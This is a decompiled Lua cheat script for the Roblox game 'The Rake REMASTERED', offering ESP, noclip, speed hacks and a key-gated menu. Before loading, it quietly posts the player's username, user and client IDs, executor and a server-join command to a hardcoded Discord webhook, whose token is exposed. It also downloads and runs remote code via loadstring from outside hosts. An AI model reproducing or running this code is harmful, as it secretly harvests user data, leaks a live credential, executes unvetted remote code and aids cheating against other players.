-- CN
-- 开源by：MR
-- http://qins.mc.hi.cn/MR-S
-- 功能效果没测试过,自行测试,如有损坏自行修复！
-- 全源开源，应该没有人闲的没事拿这个圈钱吧？
-- 最后：请标明来源，谢谢！

-- EN
-- Open Source by: MR
-- http://qins.mc.hi.cn/MR-S
-- Functionality hasn't been tested; test it yourself and fix any issues if damaged!
-- Fully open-source; hopefully no one would bother monetizing this, right?
-- Lastly: Please credit the source, thank you!


local vu1 = 'voidpath_key.txt'
local v2 = game:GetService('HttpService')
local vu3 = game:HttpGet('https://billowing-wave-838f.voidpathhub.workers.dev/')
local vu4 = v2:JSONDecode(vu3)

local function vu149()
    local v5 = game:GetService('HttpService')
    local v6 = game:GetService('Players').LocalPlayer
    local v7 = v6.DisplayName
    local _ = v6.Character
    local v8 = v6.UserId .. '-' .. v6.AccountAge
    local v9 = [[https://discord.com/api/webhooks/1405898387127013566/YQaoo48mlF5tdAxG_tS7cYRcp2FJ1Nsad-3cUQo_V8foqFrC5wUVsX1s8vuTymp2cbjY]]
    local v10, v11 = identifyexecutor()
    local v12 = os.time() - v6.AccountAge * 86400
    local v13 = os.date('!*t', v12)
    local v14 = {
        username = 'The Rake Execution Logs',
        avatar_url = [[https://cdn.discordapp.com/attachments/1405888287222267975/1405897113468145664/bbmkV2u.png?ex=68a07f38&is=689f2db8&hm=62331a878029b00d0d0c4c9cf430a3525a3fdfcc62ba58376263a3add9a23909&]],
    }
    local v15 = {}
    local v16 = {
        color = 3093151,
        title = 'Execution Log',
        thumbnail = {
            url = v5:JSONDecode((game:HttpGet(string.format([[https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true]], v6.UserId)))).data[1].imageUrl,
        },
    }
    local v17 = {}
    local v18 = {
        name = 'Username',
        value = v6.Name,
        inline = true,
    }
    local v19 = {
        name = 'Join User',
        value = [[```game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. ',"' .. game.JobId .. '")```',
        inline = false,
    }
    local v20 = {
        name = 'Client ID',
        value = game:GetService('RbxAnalyticsService'):GetClientId(),
        inline = false,
    }

    __set_list(v17, 1, {
        v18,
        {
            name = 'Display Name',
            value = v7,
            inline = true,
        },
        v19,
        {
            name = 'HWID',
            value = v8,
            inline = false,
        },
        v20,
        {
            name = 'Executor',
            value = v10 .. ' ' .. v11,
            inline = true,
        },
        {
            name = 'Account Age',
            value = v6.AccountAge .. ' day(s)',
            inline = true,
        },
        {
            name = 'Date Joined',
            value = v13.month .. '/' .. v13.day .. '/' .. v13.year,
            inline = true,
        },
    })

    v16.fields = v17
    v16.timestamp = DateTime.now():ToIsoDate()

    __set_list(v15, 1, {
        v16
    })

    v14.embeds = v15

    local v21 = request or http_request

    if v21 then
        v21({
            Url = v9,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json',
            },
            Body = v5:JSONEncode(v14),
        })
    end

    local vu22 = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local vu23 = loadstring(game:HttpGet([[https://raw.githubusercontent.com/GhostDuckyy/ESP-Library/main/Kiriot22/source.lua]]))()

    vu23.Name = true
    vu23.TeamColor = false
    vu23.Tracers = false
    vu23.Boxes = false

    local v24 = game:GetService('Players')

    game:GetService('RunService')
    game:GetService('UserInputService')

    local vu25 = game:GetService('Lighting')
    local _ = workspace.CurrentCamera
    local vu26 = v24.LocalPlayer
    local v27 = vu22
    local v28 = {
        Name = 'VoidPath | The Rake REMASTERED',
        Icon = 0,
        LoadingTitle = 'VoidPath | The Rake REMASTERED',
        LoadingSubtitle = 'by Ryan',
        ShowText = 'VoidPath',
        Theme = {
            TextColor = Color3.fromRGB(255, 255, 255),
            Background = Color3.fromRGB(10, 10, 10),
            Topbar = Color3.fromRGB(15, 15, 15),
            Shadow = Color3.fromRGB(5, 5, 5),
            NotificationBackground = Color3.fromRGB(20, 20, 20),
            NotificationActionsBackground = Color3.fromRGB(240, 240, 240),
            TabBackground = Color3.fromRGB(25, 25, 25),
            TabStroke = Color3.fromRGB(40, 40, 40),
            TabBackgroundSelected = Color3.fromRGB(255, 255, 255),
            TabTextColor = Color3.fromRGB(255, 255, 255),
            SelectedTabTextColor = Color3.fromRGB(0, 0, 0),
            ElementBackground = Color3.fromRGB(20, 20, 20),
            ElementBackgroundHover = Color3.fromRGB(30, 30, 30),
            SecondaryElementBackground = Color3.fromRGB(15, 15, 15),
            ElementStroke = Color3.fromRGB(50, 50, 50),
            SecondaryElementStroke = Color3.fromRGB(40, 40, 40),
            SliderBackground = Color3.fromRGB(200, 200, 200),
            SliderProgress = Color3.fromRGB(0, 0, 0),
            SliderStroke = Color3.fromRGB(255, 255, 255),
            ToggleBackground = Color3.fromRGB(20, 20, 20),
            ToggleEnabled = Color3.fromRGB(255, 255, 255),
            ToggleDisabled = Color3.fromRGB(80, 80, 80),
            ToggleEnabledStroke = Color3.fromRGB(255, 255, 255),
            ToggleDisabledStroke = Color3.fromRGB(120, 120, 120),
            ToggleEnabledOuterStroke = Color3.fromRGB(200, 200, 200),
            ToggleDisabledOuterStroke = Color3.fromRGB(60, 60, 60),
            DropdownSelected = Color3.fromRGB(30, 30, 30),
            DropdownUnselected = Color3.fromRGB(20, 20, 20),
            InputBackground = Color3.fromRGB(15, 15, 15),
            InputStroke = Color3.fromRGB(80, 80, 80),
            PlaceholderColor = Color3.fromRGB(180, 180, 180),
        },
        ToggleUIKeybind = 'K',
        DisableRayfieldPrompts = false,
        DisableBuildWarnings = false,
        ConfigurationSaving = {
            Enabled = true,
            FolderName = 'VoidPath',
            FileName = 'VoidPathKeySystem',
        },
    }
    local v29 = vu22.CreateWindow(v27, v28)
    local v30 = v29:CreateTab('Introduction', 'info')

    v30:CreateLabel('Welcome to VoidPath The Rake REMASTERED Hub!')
    v30:CreateLabel('Version 1.0 | Author: Ryan')
    v30:CreateButton({
        Name = 'Copy Discord Invite',
        Callback = function()
            setclipboard('https://discord.gg/ssnKXk7J8G')
            vu22:Notify({
                Title = 'Copied to Clipboard',
                Content = 'Discord invite link copied!',
                Duration = 5,
                Image = 4483362458,
            })
        end,
    })

    local v31 = vu22

    vu22.Notify(v31, {
        Title = 'Welcome to VoidPath',
        Content = "You're now running the Rake REMASTERED Hub.",
        Duration = 6.5,
        Image = 4483362458,
    })

    local v32 = v29:CreateTab('ESP', 'eye')
    local v33 = v29:CreateTab('Character', 'user')
    local v34 = v29:CreateTab('Misc', 'settings')

    v32:CreateSection('ESP')
    v32:CreateToggle({
        Name = 'Player ESP',
        CurrentValue = false,
        Flag = 'ESP',
        Callback = function(p35)
            vu23:Toggle(p35)
        end,
    })
    v32:CreateToggle({
        Name = 'Player ESP Boxes',
        CurrentValue = false,
        Flag = 'ESPBoxes',
        Callback = function(p36)
            vu23.Boxes = p36
        end,
    })

    local vu37 = false
    local vu38 = nil
    local vu39 = nil

    local function vu45(p40)
        if p40 then
            local v41 = p40:FindFirstChild('HumanoidRootPart')

            if v41 then
                if vu38 then
                    vu38:Destroy()

                    vu38 = nil
                end
                if vu39 then
                    vu39:Destroy()

                    vu39 = nil
                end

                local v42 = Instance.new('Highlight')

                v42.Adornee = p40
                v42.FillColor = Color3.fromRGB(255, 0, 0)
                v42.OutlineColor = Color3.fromRGB(255, 0, 0)
                v42.FillTransparency = 0.8
                v42.OutlineTransparency = 0
                v42.Parent = p40

                local v43 = Instance.new('BillboardGui')

                v43.Name = 'RakeESPLabel'
                v43.Size = UDim2.new(0, 100, 0, 40)
                v43.StudsOffset = Vector3.new(0, 4, 0)
                v43.AlwaysOnTop = true
                v43.Parent = v41

                local v44 = Instance.new('TextLabel')

                v44.Size = UDim2.new(0.5, 0, 0.5, 0)
                v44.Text = 'RAKE'
                v44.TextColor3 = Color3.new(1, 0, 0)
                v44.TextStrokeColor3 = Color3.new(0, 0, 0)
                v44.BackgroundTransparency = 1
                v44.TextScaled = true
                v44.Font = Enum.Font.GothamBold
                v44.Parent = v43
                vu38 = v42
                vu39 = v43
            end
        else
            return
        end
    end
    local function vu47()
        local v46 = workspace:FindFirstChild('Rake') or workspace:FindFirstChild('TheRake')

        if v46 and v46:FindFirstChild('HumanoidRootPart') then
            return v46
        else
            return nil
        end
    end
    local function vu49()
        vu37 = true

        local v48 = vu47()

        if v48 then
            vu45(v48)
        end
    end
    local function vu50()
        vu37 = false

        if vu38 then
            vu38:Destroy()

            vu38 = nil
        end
        if vu39 then
            vu39:Destroy()

            vu39 = nil
        end
    end

    task.spawn(function()
        while true do
            repeat
                task.wait(1)
            until vu37

            local v51 = vu47()

            if v51 and (not vu38 or vu38.Adornee ~= v51) then
                vu45(v51)
            end
        end
    end)
    v32:CreateToggle({
        Name = 'Rake ESP',
        CurrentValue = false,
        Flag = 'RakeESP',
        Callback = function(p52)
            if p52 then
                vu49()
            else
                vu50()
            end
        end,
    })

    local vu53 = game:GetService('Workspace')
    local vu54 = game:GetService('RunService')
    local vu55 = Instance.new('Folder', game.CoreGui)

    vu55.Name = 'FlareGunESP'

    local function vu59(p56)
        local v57 = Instance.new('BillboardGui')

        v57.Name = 'FlareGunESP'
        v57.AlwaysOnTop = true
        v57.Size = UDim2.new(0, 100, 0, 40)
        v57.Adornee = p56:FindFirstChildWhichIsA('BasePart')
        v57.Parent = vu55

        local v58 = Instance.new('TextLabel')

        v58.Size = UDim2.new(1, 0, 1, 0)
        v58.BackgroundTransparency = 1
        v58.Text = '\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd} Flare Gun'
        v58.TextColor3 = Color3.fromRGB(255, 50, 50)
        v58.TextStrokeTransparency = 0.3
        v58.TextScaled = true
        v58.Font = Enum.Font.GothamBold
        v58.Parent = v57
    end
    local function vu66()
        local v60 = vu53
        local v61, v62, v63 = pairs(v60:GetDescendants())

        while true do
            local v64

            v63, v64 = v61(v62, v63)

            if v63 == nil then
                break
            end
            if v64:IsA('Model') and v64.Name == 'FlareGunPickUp' and (not vu55:FindFirstChild(v64.Name .. '_' .. v64:GetDebugId()) and v64:FindFirstChildWhichIsA('BasePart')) then
                local v65 = vu59(v64)

                vu55[v64.Name .. '_' .. v64:GetDebugId()] = v65
            end
        end
    end
    local function vu72()
        local v67 = vu55
        local v68, v69, v70 = pairs(v67:GetChildren())

        while true do
            local v71

            v70, v71 = v68(v69, v70)

            if v70 == nil then
                break
            end

            v71:Destroy()
        end
    end

    local vu73 = false
    local vu74 = nil

    v32:CreateToggle({
        Name = 'Flare Gun ESP',
        CurrentValue = false,
        Flag = 'FlareESP',
        Callback = function(p75)
            vu73 = p75

            if p75 then
                vu66()

                vu74 = vu54.Heartbeat:Connect(function()
                    vu72()
                    vu66()
                end)
            else
                if vu74 then
                    vu74:Disconnect()

                    vu74 = nil
                end

                vu72()
            end
        end,
    })

    local vu76 = false
    local vu77 = nil

    local function vu84()
        if vu77 then
            vu77:Disconnect()
        end

        local vu78 = vu26.Character

        if vu78 then
            vu77 = vu54.Stepped:Connect(function()
                if vu76 then
                    local v79 = vu78
                    local v80, v81, v82 = ipairs(v79:GetDescendants())

                    while true do
                        local v83

                        v82, v83 = v80(v81, v82)

                        if v82 == nil then
                            break
                        end
                        if v83:IsA('BasePart') then
                            v83.CanCollide = false
                        end
                    end
                end
            end)
        end
    end

    v33:CreateToggle({
        Name = 'Noclip (Buggy)',
        CurrentValue = false,
        Flag = 'Noclip',
        Callback = function(p85)
            vu76 = p85

            if p85 then
                vu84()
            else
                if vu77 then
                    vu77:Disconnect()
                end

                local v86 = vu26.Character

                if v86 then
                    local v87, v88, v89 = ipairs(v86:GetDescendants())

                    while true do
                        local v90

                        v89, v90 = v87(v88, v89)

                        if v89 == nil then
                            break
                        end
                        if v90:IsA('BasePart') then
                            v90.CanCollide = true
                        end
                    end
                end
            end
        end,
    })
    vu26.CharacterAdded:Connect(function()
        if vu76 then
            wait(0.25)
            vu84()
        end
    end)

    local vu91 = {
        Brightness = vu25.Brightness,
        ClockTime = vu25.ClockTime,
        FogEnd = vu25.FogEnd,
        Ambient = vu25.Ambient,
        OutdoorAmbient = vu25.OutdoorAmbient,
    }
    local vu92 = nil

    v34:CreateToggle({
        Name = 'Fullbright',
        CurrentValue = false,
        Flag = 'Fullbright',
        Callback = function(p93)
            if p93 then
                vu92 = vu54.RenderStepped:Connect(function()
                    vu25.Brightness = 2
                    vu25.ClockTime = 12
                    vu25.FogEnd = 10000000000
                    vu25.Ambient = Color3.new(1, 1, 1)
                    vu25.OutdoorAmbient = Color3.new(1, 1, 1)
                end)
            else
                if vu92 then
                    vu92:Disconnect()
                end

                local v94, v95, v96 = pairs(vu91)

                while true do
                    local v97

                    v96, v97 = v94(v95, v96)

                    if v96 == nil then
                        break
                    end

                    vu25[v96] = v97
                end
            end
        end,
    })
    v34:CreateToggle({
        Name = 'No Jumpscare',
        CurrentValue = false,
        Flag = 'NoJumpscare',
        Callback = function(p98)
            noJumpscareEnabled = p98

            if noJumpscareEnabled then
                if heartbeatConnection then
                    heartbeatConnection:Disconnect()
                end

                heartbeatConnection = vu54.Heartbeat:Connect(function()
                    removeJumpscareEffects()
                end)
            elseif heartbeatConnection then
                heartbeatConnection:Disconnect()

                heartbeatConnection = nil
            end
        end,
    })
    v34:CreateButton({
        Name = 'Rejoin Server',
        Callback = function()
            local vu99 = game:GetService('TeleportService')
            local vu100 = game:GetService('Players');
            (function()
                local v101 = vu100.LocalPlayer

                if v101 then
                    vu99:Teleport(game.PlaceId, v101)
                end
            end)()
        end,
    })
    v34:CreateButton({
        Name = 'Server Hop',
        Callback = function()
            local vu102 = game:GetService('HttpService')
            local vu103 = game:GetService('TeleportService')
            local vu104 = game:GetService('Players')
            local vu105 = 2413927524
            local vu106 = game.JobId;
            (function()
                local v107 = ''
                local v108 = nil

                while true do
                    local vu109 = ([[https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100%s]]):format(vu105, v107 ~= '' and '&cursor=' .. v107 or '')
                    local v110, v111 = pcall(function()
                        return vu102:JSONDecode(game:HttpGet(vu109))
                    end)

                    if not (v110 and (v111 and v111.data)) then
                        warn('Failed to retrieve server list or no data.')

                        break
                    end

                    local v112, v113, v114 = ipairs(v111.data)

                    while true do
                        local v115

                        v114, v115 = v112(v113, v114)

                        if v114 == nil then
                            break
                        end
                        if v115.id ~= vu106 and v115.playing < v115.maxPlayers then
                            v108 = v115.id

                            break
                        end
                    end

                    v107 = v111.nextPageCursor

                    if v108 or not v107 then
                        break
                    end
                end

                if v108 then
                    vu103:TeleportToPlaceInstance(vu105, v108, vu104.LocalPlayer)
                else
                    warn('No available servers found.')
                end
            end)()
        end,
    })
    v33:CreateToggle({
        Name = 'Infinite Stamina',
        CurrentValue = false,
        Flag = 'InfiniteStamina',
        Callback = function(p116)
            local v117 = game:GetService('Players')
            local v118 = game:GetService('RunService')
            local vu119 = v117.LocalPlayer
            local vu120 = 24

            if _G.StaminaConnection then
                _G.StaminaConnection:Disconnect()

                _G.StaminaConnection = nil
            end
            if p116 then
                _G.StaminaConnection = v118.RenderStepped:Connect(function()
                    local v121 = vu119.Character

                    if v121 and v121:FindFirstChildOfClass('Humanoid') then
                        local v122 = v121:FindFirstChildOfClass('Humanoid')

                        if v122.MoveDirection.Magnitude > 0 and v122.WalkSpeed < vu120 then
                            v122.WalkSpeed = vu120
                        end
                    end
                end)
            end
        end,
    })

    local vu123 = nil

    v33:CreateToggle({
        Name = 'No Jump Cooldown',
        CurrentValue = false,
        Flag = 'NoJumpCooldown',
        Callback = function(p124)
            if p124 then
                vu123 = vu54.Heartbeat:Connect(function()
                    local v125 = vu26.Character
                    local v126 = v125 and v125:FindFirstChildWhichIsA('Humanoid')

                    if v126 then
                        v126.Jump = true

                        v126:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
                        v126:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
                        v126:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                        local v127, v128, v129 = ipairs(v125:GetDescendants())

                        while true do
                            local v130

                            v129, v130 = v127(v128, v129)

                            if v129 == nil then
                                break
                            end
                            if v130:IsA('BoolValue') and v130.Name:lower():find('jump') then
                                v130.Value = true
                            elseif v130:IsA('NumberValue') and v130.Name:lower():find('cooldown') then
                                v130.Value = 0
                            end
                        end
                    end
                end)
            elseif vu123 then
                vu123:Disconnect()

                vu123 = nil
            end
        end,
    })

    local v131 = game:GetService('Players')
    local vu132 = game:GetService('RunService')
    local vu133 = v131.LocalPlayer
    local vu134 = false

    v33:CreateToggle({
        Name = 'Unlock Third Person',
        CurrentValue = false,
        Flag = 'ThirdPersonToggle',
        Callback = function(p135)
            if p135 then
                vu134 = vu132.RenderStepped:Connect(function()
                    vu133.CameraMode = Enum.CameraMode.Classic
                    vu133.CameraMinZoomDistance = 5
                    vu133.CameraMaxZoomDistance = 20
                end)
            else
                if vu134 then
                    vu134:Disconnect()

                    vu134 = nil
                end

                vu133.CameraMode = Enum.CameraMode.LockFirstPerson
                vu133.CameraMinZoomDistance = 0.5
                vu133.CameraMaxZoomDistance = 0.5
            end
        end,
    })

    local vu136 = game:GetService('RunService')
    local vu137 = game:GetService('Players').LocalPlayer
    local vu138 = nil

    v33:CreateToggle({
        Name = 'Slow Fall',
        CurrentValue = false,
        Flag = 'SlowFall',
        Callback = function(p139)
            if p139 then
                vu138 = vu136.Heartbeat:Connect(function()
                    local v140 = vu137.Character
                    local v141

                    if v140 then
                        v141 = v140:FindFirstChild('HumanoidRootPart')
                    else
                        v141 = v140
                    end
                    if v140 then
                        v140 = v140:FindFirstChildWhichIsA('Humanoid')
                    end
                    if v140 and (v141 and (v140:GetState() == Enum.HumanoidStateType.Freefall and v141.Velocity.Y < - 50)) then
                        v141.Velocity = Vector3.new(v141.Velocity.X, - 5, v141.Velocity.Z)
                    end
                end)
            elseif vu138 then
                vu138:Disconnect()

                vu138 = nil
            end
        end,
    })

    local vu142 = false
    local vu143 = 16

    v33:CreateToggle({
        Name = 'Walk Speed',
        CurrentValue = false,
        Flag = 'BypassWalkSpeed',
        Callback = function(p144)
            vu142 = p144
        end,
    })
    v33:CreateSlider({
        Name = 'Speed Amount',
        Range = {
            16,
            35
        },
        Increment = 1,
        CurrentValue = 0,
        Flag = 'SpeedAmount',
        Callback = function(p145)
            vu143 = p145
        end,
    })
    vu136.RenderStepped:Connect(function()
        if vu142 then
            local v146 = vu137.Character
            local v147

            if v146 then
                v147 = v146:FindFirstChild('HumanoidRootPart')
            else
                v147 = v146
            end
            if v146 then
                v146 = v146:FindFirstChildWhichIsA('Humanoid')
            end
            if v147 and (v146 and v146.MoveDirection.Magnitude > 0) then
                v147.Velocity = v146.MoveDirection * vu143 + Vector3.new(0, v147.Velocity.Y, 0)
            end
        end
    end)

    local v148 = game:GetService('Players')

    game:GetService('RunService')

    local _ = game:GetService('Workspace')
    local _ = v148.LocalPlayer
end
local function vu152()
    local v150, v151 = pcall(function()
        return vu3
    end)

    return v150 and v151 and (vu4.key and {
        vu4.key,
    } or {}) or {}
end

if isfile and isfile(vu1) then
    local v153 = readfile(vu1)
    local v154 = vu152()

    if table.find(v154, v153) then
        vu149()

        return
    end

    pcall(delfile, vu1)
end

local vu155 = Instance.new('ScreenGui')

vu155.Name = 'VoidPathKeyUI'
vu155.ResetOnSpawn = false
vu155.IgnoreGuiInset = true
vu155.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
vu155.Parent = game:GetService('CoreGui')

local v156 = Instance.new('Frame', vu155)

v156.Size = UDim2.new(0, 420, 0, 220)
v156.Position = UDim2.new(0.5, - 210, 0.5, - 110)
v156.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
v156.BorderSizePixel = 0
v156.ZIndex = 2
Instance.new('UICorner', v156).CornerRadius = UDim.new(0, 12)

local v157 = Instance.new('TextLabel', v156)

v157.Size = UDim2.new(1, 0, 0, 40)
v157.Position = UDim2.new(0, 0, 0, 0)
v157.BackgroundTransparency = 1
v157.Text = 'VoidPath Key System'
v157.Font = Enum.Font.GothamBold
v157.TextSize = 22
v157.TextColor3 = Color3.fromRGB(242, 243, 243)
v157.ZIndex = 3

local vu158 = Instance.new('TextBox', v156)

vu158.Text = 'Enter your key...'
vu158.PlaceholderText = 'Enter your key...'
vu158.Size = UDim2.new(0.9, 0, 0, 40)
vu158.Position = UDim2.new(0.05, 0, 0.3, 0)
vu158.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
vu158.TextColor3 = Color3.new(1, 1, 1)
vu158.TextSize = 18
vu158.Font = Enum.Font.Gotham
vu158.BorderSizePixel = 0
vu158.ZIndex = 3
Instance.new('UICorner', vu158).CornerRadius = UDim.new(0, 8)

local vu159 = Instance.new('TextLabel', v156)

vu159.Size = UDim2.new(1, 0, 0, 24)
vu159.Position = UDim2.new(0, 0, 0.55, 0)
vu159.BackgroundTransparency = 1
vu159.Font = Enum.Font.Gotham
vu159.TextSize = 16
vu159.Text = ''
vu159.TextColor3 = Color3.fromRGB(255, 100, 100)
vu159.ZIndex = 3

local v160 = Instance.new('TextButton', v156)

v160.Size = UDim2.new(0.425, 0, 0, 38)
v160.Position = UDim2.new(0.05, 0, 0.72, 0)
v160.Text = 'Submit'
v160.Font = Enum.Font.GothamSemibold
v160.TextSize = 18
v160.TextColor3 = Color3.new(3, 3, 3)
v160.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
v160.BorderSizePixel = 0
v160.ZIndex = 3
Instance.new('UICorner', v160).CornerRadius = UDim.new(0, 8)

local v161 = Instance.new('TextButton', v156)

v161.Size = UDim2.new(0.425, 0, 0, 38)
v161.Position = UDim2.new(0.525, 0, 0.72, 0)
v161.Text = 'Get Key'
v161.Font = Enum.Font.GothamSemibold
v161.TextSize = 18
v161.TextColor3 = Color3.new(1, 1, 1)
v161.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
v161.BorderSizePixel = 0
v161.ZIndex = 3
Instance.new('UICorner', v161).CornerRadius = UDim.new(0, 8)

v160.MouseButton1Click:Connect(function()
    local v162 = vu158.Text:upper()
    local v163 = vu152()

    if table.find(v163, v162) then
        vu159.TextColor3 = Color3.fromRGB(100, 255, 120)
        vu159.Text = 'Valid key! Loading...'

        if writefile then
            writefile(vu1, v162)
        end

        wait(1)
        vu155:Destroy()
        vu149()
    else
        vu159.TextColor3 = Color3.fromRGB(255, 80, 80)
        vu159.Text = 'Invalid key. Try again.'

        pcall(delfile, vu1)
    end
end)
v161.MouseButton1Click:Connect(function()
    setclipboard('https://www.voidpath.pro/')

    vu159.TextColor3 = Color3.fromRGB(242, 243, 243)
    vu159.Text = 'Link copied to clipboard!'
end)